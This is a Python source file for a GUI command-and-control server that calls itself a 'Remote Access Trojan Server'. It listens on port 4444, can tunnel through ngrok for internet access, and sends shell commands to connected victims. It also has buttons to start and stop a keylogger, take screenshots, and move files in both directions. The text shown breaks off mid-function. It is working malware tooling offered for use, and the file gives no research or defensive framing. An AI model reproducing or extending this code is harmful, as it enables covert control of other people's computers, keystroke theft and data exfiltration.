import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk, filedialog, simpledialog
import socket
import threading
import subprocess
import os
import json
import base64
import time
import requests
import webbrowser
from datetime import datetime

class ReverseShellServer:
    def __init__(self, root):
        self.root = root
        self.root.title("K0m1t3DC - Reverse Shell Server")
        self.root.geometry("1000x750")
        
        self.setup_calm_theme()
        
        # Socket variables
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.is_running = False
        self.current_dir = ""
        self.first_connection = True 
        self.ngrok_process = None
        self.ngrok_url = None
        
        # Buffers for large data transfer
        self.screenshot_data = None
        self.upload_buffer = None
        
        self.setup_ui()
        self.load_config()
    
    def setup_calm_theme(self): 
        """Setup calm dark theme with soft colors"""
        self.bg_color = "#000000" 
        self.fg_color = "#e6e6e6"  
        self.accent_color = "#784cf0" 
        self.widget_bg = "#16213e" 
        self.widget_fg = "#e6e6e6" 
        self.entry_bg = "#020E1F" 
        self.button_bg = "#16213e" 
        self.button_active = "#0f603e" 
        
        self.waiting_color = "#f9a826" 
        self.connected_color = "#4cd137" 
        self.error_color = "#e84118" 
        
        self.root.configure(bg=self.bg_color)
        self.root.option_add('*Font', 'Consolas 10')
        
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TButton', 
                       background=self.button_bg, 
                       foreground=self.fg_color,
                       borderwidth=1,
                       relief='raised')
        style.map('TButton',
                 background=[('active', self.button_active)],
                 foreground=[('active', self.fg_color)])
        
        style.configure('TEntry',
                       fieldbackground=self.entry_bg,
                       foreground=self.fg_color,
                       insertcolor=self.fg_color)
        
        style.configure('TFrame', background=self.bg_color)
        
    def setup_ui(self):
        # Title Label
        title_frame = tk.Frame(self.root, bg=self.bg_color)
        title_frame.pack(pady=(10, 5))
        
        title_label = tk.Label(title_frame, 
                              text="🔧 Remote Access Trojan Server", 
                              font=("Consolas", 14, "bold"),
                              bg=self.bg_color,
                              fg=self.fg_color)
        title_label.pack()
        
        subtitle_label = tk.Label(title_frame,
                                 text="Tool by komit3dc | Ngrok Supported",
                                 font=("Consolas", 9),
                                 bg=self.bg_color,
                                 fg=self.accent_color)
        subtitle_label.pack()
        
        # Mode Selection Frame
        mode_frame = tk.Frame(self.root, bg=self.bg_color)
        mode_frame.pack(pady=5)
        
        tk.Label(mode_frame, 
                text="Mode:", 
                bg=self.bg_color, 
                fg=self.fg_color,
                font=("Consolas", 10)).pack(side=tk.LEFT, padx=5)
        
        self.mode_var = tk.StringVar(value="local")
        tk.Radiobutton(mode_frame, text="Local", variable=self.mode_var, value="local",
                      bg=self.bg_color, fg=self.fg_color, selectcolor=self.widget_bg,
                      command=self.on_mode_change).pack(side=tk.LEFT, padx=5)
        
        tk.Radiobutton(mode_frame, text="Ngrok (Internet)", variable=self.mode_var, value="ngrok",
                      bg=self.bg_color, fg=self.fg_color, selectcolor=self.widget_bg,
                      command=self.on_mode_change).pack(side=tk.LEFT, padx=5)
        
        # Control Frame
        control_frame = tk.Frame(self.root, bg=self.bg_color)
        control_frame.pack(pady=10)
        
        # Port configuration (local mode)
        self.port_frame = tk.Frame(control_frame, bg=self.bg_color)
        self.port_frame.pack(side=tk.LEFT, padx=5)
        
        tk.Label(self.port_frame, 
                text="Port:", 
                bg=self.bg_color, 
                fg=self.fg_color,
                font=("Consolas", 10)).pack(side=tk.LEFT)
        
        self.port_entry = tk.Entry(self.port_frame, 
                                  width=10, 
                                  bg=self.entry_bg,
                                  fg=self.fg_color,
                                  insertbackground=self.fg_color,
                                  relief='sunken',
                                  font=("Consolas", 10))
        self.port_entry.insert(0, "4444")
        self.port_entry.pack(side=tk.LEFT, padx=5)
        
        # Ngrok port frame (hidden by default)
        self.ngrok_port_frame = tk.Frame(control_frame, bg=self.bg_color)
        
        tk.Label(self.ngrok_port_frame, 
                text="Port:", 
                bg=self.bg_color, 
                fg=self.fg_color,
                font=("Consolas", 10)).pack(side=tk.LEFT)
        
        self.ngrok_port_entry = tk.Entry(self.ngrok_port_frame, 
                                        width=10, 
                                        bg=self.entry_bg,
                                        fg=self.fg_color,
                                        insertbackground=self.fg_color,
                                        font=("Consolas", 10))
        self.ngrok_port_entry.insert(0, "4444")
        self.ngrok_port_entry.pack(side=tk.LEFT, padx=5)
        
        # Buttons with custom styling
        button_style = {
            'bg': self.button_bg,
            'fg': self.fg_color,
            'activebackground': self.button_active,
            'activeforeground': self.fg_color,
            'relief': 'raised',
            'bd': 1,
            'font': ("Consolas", 9, "bold"),
            'cursor': 'hand2'
        }
        
        self.start_btn = tk.Button(control_frame, 
                                  text="▶ START SERVER", 
                                  command=self.start_server,
                                  **button_style)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(control_frame, 
                                 text="⏹ STOP SERVER", 
                                 command=self.stop_server, 
                                 state=tk.DISABLED,
                                 **button_style)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Ngrok URL button
        self.ngrok_url_btn = tk.Button(control_frame,
                                      text="🌐 GET URL",
                                      command=self.get_ngrok_url,
                                      state=tk.DISABLED,
                                      bg="#9b59b6",
                                      fg=self.fg_color,
                                      activebackground="#8e44ad",
                                      font=("Consolas", 9, "bold"),
                                      relief='raised',
                                      padx=10,
                                      cursor='hand2')
        self.ngrok_url_btn.pack(side=tk.LEFT, padx=5)
        
        # Connection Info
        info_frame = tk.Frame(self.root, bg=self.bg_color)
        info_frame.pack(pady=5)
        
        self.status_label = tk.Label(info_frame, 
                                    text="⏳ Status: Ready", 
                                    fg=self.waiting_color,
                                    bg=self.bg_color,
                                    font=("Consolas", 10, "bold"))
        self.status_label.pack()
        
        # Ngrok URL display
        self.ngrok_url_label = tk.Label(info_frame,
                                       text="",
                                       fg=self.accent_color,
                                       bg=self.bg_color,
                                       font=("Consolas", 9),
                                       cursor="hand2")
        self.ngrok_url_label.pack()
        self.ngrok_url_label.bind("<Button-1>", self.open_ngrok_dashboard)
        
        # Command Frame
        cmd_frame = tk.Frame(self.root, bg=self.bg_color)
        cmd_frame.pack(pady=10, fill=tk.X, padx=20)
        
        tk.Label(cmd_frame, 
                text="Command:", 
                bg=self.bg_color, 
                fg=self.fg_color,
                font=("Consolas", 10)).pack(side=tk.LEFT)
        
        self.cmd_entry = tk.Entry(cmd_frame, 
                                 width=60, 
                                 bg=self.entry_bg,
                                 fg=self.fg_color,
                                 insertbackground=self.fg_color,
                                 font=("Consolas", 10))
        self.cmd_entry.pack(side=tk.LEFT, padx=10)
        self.cmd_entry.bind('<Return>', self.send_command)
        
        self.send_btn = tk.Button(cmd_frame, 
                                 text="SEND", 
                                 command=self.send_command, 
                                 state=tk.DISABLED,
                                 **button_style)
        self.send_btn.pack(side=tk.LEFT)

        # Quick Commands Frame
        quick_frame = tk.Frame(self.root, bg=self.bg_color)
        quick_frame.pack(pady=5)
        
        quick_commands = [
            ("📊 System Info", "systeminfo"),
            ("📁 Directory", "dir"),
            ("📂 Current Dir", "cd"),
            ("📈 Process List", "tasklist"),
            ("📸 Screenshot", "screenshot"),
            ("⌨️ Keylogger Start", "keylogger_start"),
            ("⏹️ Keylogger Stop", "keylogger_stop")
        ]
        
        for text, cmd in quick_commands:
            btn = tk.Button(quick_frame, 
                          text=text, 
                          command=lambda c=cmd: self.quick_command(c),
                          bg=self.button_bg,
                          fg=self.fg_color,
                          activebackground=self.button_active,
                          activeforeground=self.fg_color,
                          font=("Consolas", 8),
                          relief='raised',
                          bd=1,
                          padx=8,
                          pady=4,
                          cursor='hand2')
            btn.pack(side=tk.LEFT, padx=2)
        
        # Separator
        sep = tk.Frame(self.root, height=2, bg=self.accent_color)
        sep.pack(fill=tk.X, padx=20, pady=10)
        
        # Output Area with custom styling
        output_frame = tk.Frame(self.root, bg=self.bg_color)
        output_frame.pack(pady=10, fill=tk.BOTH, expand=True, padx=20)
        
        # Output label
        output_label = tk.Label(output_frame, 
                               text="📟 COMMAND OUTPUT", 
                               bg=self.bg_color, 
                               fg=self.fg_color,
                               font=("Consolas", 10, "bold"))
        output_label.pack(anchor='w', pady=(0, 5))
        
        # Custom scrollbar style
        self.output_text = scrolledtext.ScrolledText(output_frame, 
                                                    height=20,
                                                    bg=self.entry_bg,
                                                    fg=self.fg_color,
                                                    insertbackground=self.fg_color,
                                                    font=("Consolas", 9),
                                                    relief='sunken',
                                                    bd=2)
        
        # Configure tags for different message types
        self.output_text.tag_config("command", foreground="#4cc9f0")  
        self.output_text.tag_config("success", foreground="#4cd137") 
        self.output_text.tag_config("error", foreground="#e84118")    
        self.output_text.tag_config("info", foreground="#f9a826")   
        self.output_text.tag_config("connection", foreground="#4cc9f0")  
        self.output_text.tag_config("ascii_art", foreground="#f9a826") 
        self.output_text.tag_config("banner", foreground="#784cf0")
        self.output_text.tag_config("ngrok", foreground="#9b59b6")
        self.output_text.tag_config("process_header", foreground="#00ffaa")
        self.output_text.tag_config("timestamp", foreground="#95a5a6")
        
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # File Transfer Frame
        file_frame = tk.Frame(self.root, bg=self.bg_color)
        file_frame.pack(pady=10, fill=tk.X, padx=20)
        
        file_label = tk.Label(file_frame, 
                             text="📁 FILE TRANSFER", 
                             bg=self.bg_color, 
                             fg=self.fg_color,
                             font=("Consolas", 10, "bold"))
        file_label.pack(anchor='w', pady=(0, 5))
        
        # File buttons
        file_button_style = {
            'bg': self.button_bg,
            'fg': self.fg_color,
            'activebackground': self.button_active,
            'activeforeground': self.fg_color,
            'font': ("Consolas", 9),
            'relief': 'raised',
            'bd': 1,
            'padx': 12,
            'pady': 6,
            'cursor': 'hand2'
        }
        
        tk.Button(file_frame, 
                 text="⬆️ UPLOAD FILE", 
                 command=self.upload_file,
                 **file_button_style).pack(side=tk.LEFT, padx=5)
        
        tk.Button(file_frame, 
                 text="⬇️ DOWNLOAD FILE", 
                 command=self.download_file,
                 **file_button_style).pack(side=tk.LEFT, padx=5)
        
        tk.Button(file_frame, 
                 text="📋 LIST FILES", 
                 command=lambda: self.send_command_event("dir"),
                 **file_button_style).pack(side=tk.LEFT, padx=5)
        
        # Footer
        footer_frame = tk.Frame(self.root, bg=self.bg_color)
        footer_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        
        footer_label = tk.Label(footer_frame, 
                               text="🔒 Nothing is true | everything is permitted",
                               bg=self.bg_color,
                               fg=self.accent_color,
                               font=("Consolas", 8))
        footer_label.pack()
    
    def on_mode_change(self):
        """Handle mode change between local and ngrok"""
        if self.mode_var.get() == "local":
            self.port_frame.pack(side=tk.LEFT, padx=5)
            self.ngrok_port_frame.pack_forget()
        else:
            self.port_frame.pack_forget()
            self.ngrok_port_frame.pack(side=tk.LEFT, padx=5)
    
    def start_ngrok_tunnel(self, port):
        """Start ngrok tunnel"""
        try:
            ngrok_cmd = f"ngrok tcp {port}"
            self.ngrok_process = subprocess.Popen(
                ngrok_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            time.sleep(3)
            
            try:
                response = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                if response.status_code == 200:
                    tunnels = response.json()["tunnels"]
                    
                    for tunnel in tunnels:
                        if tunnel["proto"] == "tcp":
                            self.ngrok_url = tunnel["public_url"]
                            self.log_message(f"[NGROK] Tunnel created: {self.ngrok_url}", "ngrok")
                            
                            self.ngrok_url_label.config(text=f"🌐 {self.ngrok_url}")
                            self.ngrok_url_btn.config(state=tk.NORMAL)
                            
                            self.log_message(f"[NGROK] Client should connect to: {self.ngrok_url}", "ngrok")
                            self.log_message("[NGROK] Example: tcp://0.tcp.ngrok.io:12345", "ngrok")
                            self.log_message("[NGROK] Copy URL and share with client", "ngrok")
                            
                            return True
                else:
                    self.log_message("[NGROK] Failed to get ngrok URL. Make sure ngrok is running.", "error")
                    return False
                    
            except requests.RequestException as e:
                self.log_message(f"[NGROK] Error getting URL: {str(e)}", "error")
                self.log_message("[NGROK] Make sure ngrok is installed and authenticated", "error")
                self.log_message("[NGROK] Run: ngrok config add-authtoken YOUR_TOKEN", "error")
                return False
                
        except Exception as e:
            self.log_message(f"[NGROK] Failed to start ngrok: {str(e)}", "error")
            return False
    
    def stop_ngrok_tunnel(self):
        """Stop ngrok tunnel"""
        if self.ngrok_process:
            self.ngrok_process.terminate()
            self.ngrok_process = None
            self.ngrok_url = None
            self.ngrok_url_label.config(text="")
            self.ngrok_url_btn.config(state=tk.DISABLED)
            self.log_message("[NGROK] Tunnel stopped", "ngrok")
    
    def get_ngrok_url(self):
        """Get ngrok URL and copy to clipboard"""
        if self.ngrok_url:
            try:
                import pyperclip
                pyperclip.copy(self.ngrok_url)
                copied_msg = " (copied to clipboard)"
            except ImportError:
                copied_msg = ""
                
            messagebox.showinfo("Ngrok URL", 
                              f"📡 Ngrok URL: {self.ngrok_url}{copied_msg}\n\n"
                              f"🔗 Share this with your client.")
            
            self.log_message(f"[NGROK] URL: {self.ngrok_url}{copied_msg}", "ngrok")
        else:
            messagebox.showwarning("No URL", "No active ngrok tunnel found.")
    
    def open_ngrok_dashboard(self, event=None):
        """Open ngrok dashboard in browser"""
        webbrowser.open("http://localhost:4040")
    
    def display_ascii_art(self):
        """Display ASCII art on first connection"""
        ascii_art = """  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      ⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣄⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     ⢀⡾⣡⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠙⣦⡙⢦⡀⠀⠀⠀⠀⠀⠀⡀⣄⡀⠀⡴⠸⣄⠀⣠⠎⢦⠀⢀⣠⢀⠀⠀⠀⠀⠀⠀⢀⡴⢋⣴⠏⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠘⢯⣦⣉⡳⠦⣄⡾⠶⠄⠛⢄⠉⣙⠁⣆⣌⠶⢃⣰⠈⢛⠉⠠⠚⠢⠶⠿⣠⠤⠞⣋⢴⡿⠋⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢠⠀⠈⢻⡻⣽⣶⣦⣄⠠⣄⠕⣤⣢⣞⣷⡜⣿⣶⣿⢧⣾⣷⣗⣤⠪⢀⠄⣠⣴⣶⣟⣟⡟⠁⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡸⡂⠀⠀⠓⠘⢦⠀⠁⠁⠘⣦⢪⢿⣿⣿⠻⣿⣿⣿⠟⣿⣿⣿⡵⣴⠃⠘⠉⠐⡵⠋⠞⠀⠀⢀⢇⣻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⣧⡀⠀⠀⠀⠄⠘⣧⠀⠀⠀⠸⣿⣿⣿⣿⣇⠘⣿⠃⣸⣿⣿⣿⣿⠇⠀⠀⠀⣼⠃⠀⠀⠀⠀⠘⢼⡸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⢿⡳⠀⠀⠀⠀⠀⠘⣧⡘⣦⣷⣻⢿⡿⣿⣿⣧⠀⣰⣿⣿⢿⡿⣿⣼⣴⣇⣼⠃⠀⠀⠀⠀⢀⠞⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢸⡀⡈⢷⠄⠀⠀⠄⣲⣶⣾⡿⠿⢝⠿⢷⡕⠸⡿⣿⢷⣿⣯⡏⢪⡾⠫⣻⠿⢿⣷⣶⣖⠢⠀⠀⠀⡾⢃⠀⡇⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢯⡛⠁⠘⠀⠀⠀⠀⡴⣖⣚⣿⣧⣄⠠⡀⠀⠹⣆⢳⠉⠀⠉⡞⣠⠏⠀⢀⠄⣠⣼⣿⣓⣒⠦⠀⠀⠀⠀⠂⡈⠛⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢋⣤⣤⡖⠋⠁⠀⣠⣴⣟⢿⡿⣿⣿⣽⣦⣄⠈⠎⠣⠀⠘⠱⠁⢠⣴⣯⣿⣿⢿⡿⣿⣦⣄⠀⠈⠛⣶⣦⣄⡘⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢟⡖⢀⣤⡤⠔⠂⠠⠼⢿⡡⠌⠁⠈⡀⠻⣝⣿⣿⣆⡆⠀⠀⠀⢠⣴⣿⣿⢿⠟⢁⠁⠈⠀⢉⡿⠷⠄⠐⠢⠤⣤⡀⢲⡛⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠐⡻⠉⠀⠀⠀⠀⣀⡬⠀⠀⡤⡀⠻⣦⡀⠙⣿⡿⠇⠀⠀⠀⠸⢿⣿⠃⢁⣴⡟⢀⣤⠀⠀⢥⣄⠀⠀⠀⠀⠉⢝⠂⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢇⣼⣧⢾⣽⡂⢠⣾⠿⢿⣿⣧⣝⣿⣦⣄⠀⠀⠀⠀⠠⣴⣀⣦⡤⠀⠀⠀⠀⣀⣴⣟⣫⣴⣿⣿⠿⣷⣄⢀⢮⡷⢮⣧⡘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡚⠉⠐⣩⡯⠖⢀⣤⢆⡀⠀⠉⠛⢻⡭⠀⠀⠲⢮⣽⣦⠸⣿⠏⣴⣏⡽⠖⠀⠀⢹⡟⠛⠋⠀⠀⡰⣤⡄⠰⢽⣍⠂⠉⢛⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⣠⠀⢚⡭⠂⠀⢉⣾⡿⠉⠀⠀⠀⢠⡶⢿⣷⣿⣦⠸⠿⠳⠉⠞⠿⠏⣴⣿⣾⡿⢶⣄⠀⠀⠀⠨⢿⣷⡍⠀⠐⢮⡓⠄⣄⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⡴⢋⣔⠄⠀⠀⡟⠀⡴⣾⠀⠀⡏⠀⢰⣿⢿⡇⠐⠊⠻⣿⠟⠉⠂⢹⣿⣿⡞⠀⠸⡄⠀⢳⢦⠀⢻⠀⠀⠠⡢⡙⢦⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠟⡀⢸⣿⠊⠀⠀⠃⠀⠁⡏⡆⠀⠀⠐⢌⠻⣟⣧⡀⠀⠀⠀⠀⠀⢀⣼⣳⡟⡡⠂⠀⢰⢿⠈⠂⠈⠀⠀⠑⣽⡇⢀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢸⡧⠀⠀⡀⠀⠀⠀⠁⢟⣆⠀⠀⠠⡓⢽⡿⡗⠆⠀⠀⠀⠠⢾⢟⡿⢊⠅⠀⢠⣸⡻⠈⠀⠀⠀⢀⠀⠀⢾⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⣠⡎⣾⠄⠰⡁⠄⠀⠀⠈⢻⡀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⢀⡾⠁⠀⠀⠀⣀⠆⠀⣳⢰⣄⠁⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣰⠋⣧⠟⢀⢀⣿⡔⢰⠇⠀⠀⠁⠀⠀⣿⠀⡇⢰⢠⠀⡆⡆⢸⠀⣷⠁⠀⠈⠀⠀⠐⡆⢢⣻⡀⡀⠻⣸⠙⣆⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠇⠀⠸⡄⡾⣆⠻⡇⠘⠀⢀⠀⠀⠀⢀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠏⠀⠀⠀⠀⡀⠀⠃⢸⠟⣰⣿⢀⠏⠀⠸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠁⣿⠀⣴⠀⢸⢺⠀⠀⠀⠘⠀⢸⠀⠀⠀⠀⠀⠀⠀⡇⠀⡇⠀⠀⠀⢳⡄⠀⣶⠀⢹⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡜⠹⠳⣌⣿⡄⠀⠀⢇⠀⢻⢠⠀⠀⠀⠀⠀⡄⡯⠀⢰⠀⠀⢠⣿⢡⠞⠏⢧⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠈⠫⢳⣔⢠⠀⠀⡌⠈⠋⠃⠂⠘⠉⠁⢁⠀⠀⡄⣤⡞⠝⠁⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⡆⣦⠈⠓⠒⠒⠒⠒⠒⠚⠁⣰⢠⣵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠘⢧⡈⢾⣴⣾⣦⠶⢃⡼⠃⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ██╗░░██╗░█████╗░███╗░░░███╗██╗████████╗███████╗  ██████╗░░█████╗░
        ██║░██╔╝██╔══██╗████╗░████║██║╚══██╔══╝██╔════╝  ██╔══██╗██╔══██╗
        █████═╝░██║░░██║██╔████╔██║██║░░░██║░░░█████╗░░  ██║░░██║██║░░╚═╝
        ██╔═██╗░██║░░██║██║╚██╔╝██║██║░░░██║░░░██╔══╝░░  ██║░░██║██║░░██╗
        ██║░╚██╗╚█████╔╝██║░╚═╝░██║██║░░░██║░░░███████╗  ██████╔╝╚█████╔╝
        ╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░░╚════╝░
        """
        
        self.output_text.insert(tk.END, "\n" + "═" * 80 + "\n", "timestamp")
        self.output_text.insert(tk.END, "\n" + ascii_art + "\n", "banner")
        self.output_text.insert(tk.END, "═" * 80 + "\n\n", "timestamp")
        self.output_text.see(tk.END)
    
    def load_config(self):
        try:
            with open("config.json", "r") as f:
                config = json.load(f)
                self.port_entry.delete(0, tk.END)
                self.port_entry.insert(0, str(config.get("port", 4444)))
                self.ngrok_port_entry.delete(0, tk.END)
                self.ngrok_port_entry.insert(0, str(config.get("ngrok_port", 4444)))
                self.mode_var.set(config.get("mode", "local"))
                self.on_mode_change()
        except:
            pass
    
    def save_config(self):
        config = {
            "port": int(self.port_entry.get()),
            "ngrok_port": int(self.ngrok_port_entry.get()),
            "mode": self.mode_var.get()
        }
        with open("config.json", "w") as f:
            json.dump(config, f)
    
    def start_server(self):
        mode = self.mode_var.get()
        port = int(self.port_entry.get() if mode == "local" else self.ngrok_port_entry.get())
        self.save_config()
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', port))
            self.server_socket.listen(5)
            
            self.is_running = True
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            
            if mode == "ngrok":
                self.status_label.config(text=f"🔍 Starting ngrok on port {port}...", fg=self.waiting_color)
                self.log_message("[NGROK] Starting ngrok tunnel...", "ngrok")
                
                if not self.start_ngrok_tunnel(port):
                    messagebox.showerror("Ngrok Error", 
                                        "Failed to start ngrok tunnel.\n\n"
                                        "Make sure:\n"
                                        "1. Ngrok is installed\n"
                                        "2. Authtoken is configured\n"
                                        "3. No other ngrok process is running")
                    self.stop_server()
                    return
                
                self.status_label.config(text=f"✅ Ngrok active on port {port}", fg=self.connected_color)
                self.log_message(f"[NGROK] Tunnel active: {self.ngrok_url}", "ngrok")
            else:
                self.status_label.config(text=f"🔍 Listening on port {port}...", fg=self.waiting_color)
                self.log_message(f"[+] Local server started on port {port}", "success")
            
            self.accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            self.accept_thread.start()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
    
    def accept_connections(self):
        while self.is_running:
            try:
                client_socket, client_address = self.server_socket.accept()
                self.client_socket = client_socket
                self.client_address = client_address
                
                self.root.after(0, self.handle_new_connection, client_address)
                
                self.receive_thread = threading.Thread(target=self.receive_data, daemon=True)
                self.receive_thread.start()
                
            except:
                break
    
    def handle_new_connection(self, address):
        mode = self.mode_var.get()
        if mode == "ngrok":
            self.status_label.config(text=f"✅ Connected via Ngrok: {address}", fg=self.connected_color)
            self.log_message(f"[+] Connection from {address} via Ngrok", "connection")
        else:
            self.status_label.config(text=f"✅ Connected: {address}", fg=self.connected_color)
            self.log_message(f"[+] Connection from {address}", "connection")
        
        self.send_btn.config(state=tk.NORMAL)
        
        if self.first_connection:
            self.display_ascii_art()
            self.first_connection = False
    
    def extract_complete_json(self, buffer):
        """Extract a complete JSON object from buffer"""
        depth = 0
        start = -1
        
        for i, char in enumerate(buffer):
            if char == '{':
                if depth == 0:
                    start = i
                depth += 1
            elif char == '}':
                depth -= 1
                if depth == 0 and start != -1:
                    json_str = buffer[start:i+1]
                    remaining = buffer[i+1:]
                    return json_str, remaining
        
        return None, buffer
    
    def receive_data(self):
        """Receive data with proper JSON handling"""
        buffer = ""
        while self.is_running and self.client_socket:
            try:
                chunk = self.client_socket.recv(65536)
                if not chunk:
                    break
                
                buffer += chunk.decode('utf-8', errors='ignore')
                
                while buffer:
                    try:
                        json_str, remaining_buffer = self.extract_complete_json(buffer)
                        if json_str:
                            message = json.loads(json_str)
                            self.root.after(0, self.process_message, message)
                            buffer = remaining_buffer
                        else:
                            break
                    except json.JSONDecodeError as e:
                        self.log_message(f"[!] JSON decode error: {str(e)}", "error")
                        if '{' in buffer:
                            buffer = buffer[buffer.find('{'):]
                        else:
                            buffer = ""
                        break
                        
            except socket.timeout:
                continue
            except Exception as e:
                self.log_message(f"[!] Receive error: {str(e)}", "error")
                break
        
        self.root.after(0, self.connection_closed)
    
    def process_message(self, message):
        """Process a complete JSON message"""
        try:
            msg_type = message.get("type")
            
            if msg_type == "command_output":
                output = message.get("output", "")
                current_dir = message.get("current_dir", "")
                
                if current_dir and current_dir != self.current_dir:
                    self.current_dir = current_dir
                    self.log_message(f"[Current Dir] {self.current_dir}", "info")
                
                if "Image Name" in output or "PID" in output or "Mem Usage" in output:
                    self.display_process_list(output)
                else:
                    self.log_message(output, "info")
                    
            elif msg_type == "error":
                error = message.get("error", "")
                self.log_message(f"[ERROR] {error}", "error")
                
            elif msg_type == "file_data":
                self.handle_file_download(message)
                
            elif msg_type == "screenshot":
                self.handle_screenshot(message)
                
            elif msg_type == "system_info":
                self.handle_system_info(message)
                
            elif msg_type == "keylog_data":
                self.handle_keylog_data(message)
                
            elif msg_type == "screenshot_start":
                self.screenshot_data = {
                    "filename": message.get("filename"),
                    "total_chunks": message.get("total_chunks"),
                    "chunks": [],
                    "total_size": message.get("total_size")
                }
                self.log_message(f"[+] Receiving screenshot: {self.screenshot_data['filename']}", "info")
                
